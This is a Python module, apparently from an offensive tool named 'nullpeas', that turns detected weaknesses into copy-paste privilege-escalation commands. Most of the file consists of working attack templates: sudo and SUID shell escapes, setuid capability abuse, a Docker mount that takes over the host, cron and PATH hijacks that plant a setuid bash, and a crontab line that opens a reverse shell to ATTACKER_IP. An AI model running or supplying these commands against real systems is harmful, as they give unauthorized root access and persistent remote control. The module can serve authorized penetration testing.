"""
nullpeas/core/exploit_templates.py

This module translates abstract offensive primitives into concrete, 
copy-pasteable command strings for the operator.

It serves as the "Action Engine" for the Attack Chains.
"""

from typing import List, Dict, Tuple, Optional
from nullpeas.core.offensive_schema import Primitive

# ===========================================================================
# COMMAND TEMPLATES
# Format: (binary_name, capability_type): "template_string"
# ===========================================================================

TEMPLATES: Dict[Tuple[str, str], str] = {
    # === Sudo: Shell Escapes (capability="shell_spawn") ===
    # Editors & Pagers
    ("vim", "shell_spawn"): "sudo {binary} -c ':!/bin/sh'",
    ("vi", "shell_spawn"): "sudo {binary} -c ':!/bin/sh'",
    ("nvim", "shell_spawn"): "sudo {binary} -c ':!/bin/sh'",
    ("nano", "shell_spawn"): "sudo {binary}\n# Inside nano: Ctrl+R, Ctrl+X, then type: reset; sh 1>&0 2>&0",
    ("ed", "shell_spawn"): "sudo {binary}\n# Inside ed: !/bin/sh",
    ("less", "shell_spawn"): "sudo {binary} /etc/profile\n# Inside less: !/bin/sh",
    ("more", "shell_spawn"): "sudo {binary} /etc/profile\n# Inside more: !/bin/sh",
    ("man", "shell_spawn"): "sudo {binary} man\n# Inside man: !/bin/sh",
    ("journalctl", "shell_spawn"): "sudo {binary}\n# Inside pager: !/bin/sh",

    # Scripting Languages (Sudo)
    ("python", "shell_spawn"): "sudo {binary} -c 'import os; os.system(\"/bin/sh\")'",
    ("python2", "shell_spawn"): "sudo {binary} -c 'import os; os.system(\"/bin/sh\")'",
    ("python3", "shell_spawn"): "sudo {binary} -c 'import os; os.system(\"/bin/sh\")'",
    ("perl", "shell_spawn"): "sudo {binary} -e 'exec \"/bin/sh\";'",
    ("ruby", "shell_spawn"): "sudo {binary} -e 'exec \"/bin/sh\"'",
    ("lua", "shell_spawn"): "sudo {binary} -e 'os.execute(\"/bin/sh\")'",
    ("php", "shell_spawn"): "sudo {binary} -r \"system('/bin/sh');\"",
    ("tclsh", "shell_spawn"): "echo 'exec /bin/sh <@stdin >@stdout 2>@stderr' | sudo {binary}",
    ("expect", "shell_spawn"): "sudo {binary} -c 'spawn /bin/sh;interact'",
    ("node", "shell_spawn"): "sudo {binary} -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'",

    # === CAPABILITIES: setuid+ep (NEW) ===
    # Requires explicit setuid(0) call in the code
    ("python", "cap_setuid"): "{binary} -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
    ("python3", "cap_setuid"): "{binary} -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
    ("perl", "cap_setuid"): "{binary} -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'",
    ("ruby", "cap_setuid"): "{binary} -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'",
    ("node", "cap_setuid"): "{binary} -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'",
    ("php", "cap_setuid"): "{binary} -r \"posix_setuid(0); system('/bin/sh');\"",

    # === SUID: Known Shell Spawners (capability="suid_shell") ===
    ("bash", "suid_shell"): "{binary} -p",
    ("sh", "suid_shell"): "{binary} -p",
    ("env", "suid_shell"): "{binary} /bin/sh -p",
    ("dash", "suid_shell"): "{binary} -p",
    ("zsh", "suid_shell"): "{binary}",
    ("python", "suid_shell"): "{binary} -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
    ("python3", "suid_shell"): "{binary} -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
    ("perl", "suid_shell"): "{binary} -e 'exec \"/bin/sh\";'",
    ("make", "suid_shell"): "COMMAND='/bin/sh -p' {binary} -s --eval=$'x:\\n\\t-'" + "$COMMAND",
    ("cpulimit", "suid_shell"): "{binary} -l 100 -f /bin/sh",
    ("taskset", "suid_shell"): "{binary} 1 /bin/sh -p",
    ("flock", "suid_shell"): "{binary} -u / /bin/sh -p",
    
    # === Docker ===
    ("docker", "host_takeover"): "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
    
    # === Cron ===
    ("cron", "writable_script"): "echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> {target}\n# Wait for cron...",
    ("cron", "user_persistence"): "(crontab -l; echo '* * * * * /bin/bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"') | crontab -",

    # === PATH Hijack ===
    ("path", "hijack"): "echo -e '#!/bin/bash\\n/bin/bash -p' > {target}/<TARGET_BINARY>\nchmod +x {target}/<TARGET_BINARY>",
}


def _get_template(binary: str, capability: str) -> Optional[str]:
    # 1. Exact match
    if (binary, capability) in TEMPLATES:
        return TEMPLATES[(binary, capability)]
    
    # 2. Sudo fallback (many editors behave similarly)
    if capability == "shell_spawn" and binary in ["ed", "ex", "vi", "view", "emacs"]:
        return "sudo {binary}\n# Inside editor: !/bin/sh"
    
    # 3. Pager fallback
    if capability == "shell_spawn" and binary in ["more", "less", "pg"]:
        return "sudo {binary} /etc/profile\n# Inside pager: !/bin/sh"

    return None


def generate_exploit_for_chain(p: Primitive) -> List[str]:
    """
    Generates a list of suggested command strings for a given primitive.
    """
    cmds = []
    
    # Context extraction
    binary = p.context.get("binary")
    path = p.context.get("binary_path") or binary
    
    # === 1. ROOT SHELL PRIMITIVES (Sudo / SUID / CAPS) ===
    if p.type in {"root_shell_primitive", "suid_primitive"}:
        
        # A. Sudo (ALL) ALL
        if p.surface == "sudo" and p.context.get("is_all_rule") and p.context.get("nopasswd"):
            cmds.append("sudo su -")
            return cmds
            
        # B. Binary Specific
        if binary:
            # 1. Capabilities (NEW)
            if p.surface == "capabilities":
                tpl = _get_template(binary, "cap_setuid")
                if tpl:
                    cmds.append(tpl.format(binary=path))
                    return cmds
                else:
                    cmds.append(f"{path} # (Capabilities: {p.context.get('capabilities')})")

            # 2. SUID
            if p.surface == "suid":
                tpl = _get_template(binary, "suid_shell")
                if tpl:
                    cmds.append(tpl.format(binary=path))
                    return cmds

                # SUID fallback (reuse sudo templates, strip "sudo ")
                tpl_sudo = _get_template(binary, "shell_spawn")
                if tpl_sudo:
                    clean_cmd = tpl_sudo.replace("sudo {binary}", "{binary}")
                    cmds.append(clean_cmd.format(binary=path))
                    return cmds
                
                cmds.append(f"{path} # (Try known args like -p, --shell, or reverse engineering)")

            # 3. Sudo
            elif p.surface == "sudo":
                tpl = _get_template(binary, "shell_spawn")
                if tpl:
                    cmds.append(tpl.format(binary=path))

    # === 2. DOCKER HOST TAKEOVER ===
    elif p.type == "docker_host_takeover":
        if p.conditions.get("requires_docker_cli"):
            cmds.append(TEMPLATES[("docker", "host_takeover")])
        else:
            socket = p.affected_resource or "/var/run/docker.sock"
            cmds.append(f"curl -XPOST --unix-socket {socket} -d '{{...}}' http://localhost/containers/create")

    # === 3. ARBITRARY FILE WRITE ===
    elif p.type == "arbitrary_file_write_primitive":
        if binary:
            tpl = _get_template(binary, "file_write")
            if tpl:
                cmds.append(tpl.format(binary=path))

    # === 4. CRON EXECUTION ===
    elif p.type == "cron_exec_primitive":
        target = p.context.get("target_file")
        if target:
            tpl = TEMPLATES[("cron", "writable_script")]
            cmds.append(tpl.format(target=target))
    
    elif p.type == "cron_user_persistence_surface":
        cmds.append(TEMPLATES[("cron", "user_persistence")])

    # === 5. PATH HIJACKING ===
    elif p.type == "path_hijack_surface":
        target_dir = p.affected_resource
        if target_dir:
            tpl = TEMPLATES[("path", "hijack")]
            cmds.append(tpl.format(target=target_dir))
            cmds.append("# Replace <TARGET_BINARY> with a binary name typically run by root (e.g. 'ls', 'cat', 'python')")

    return cmds
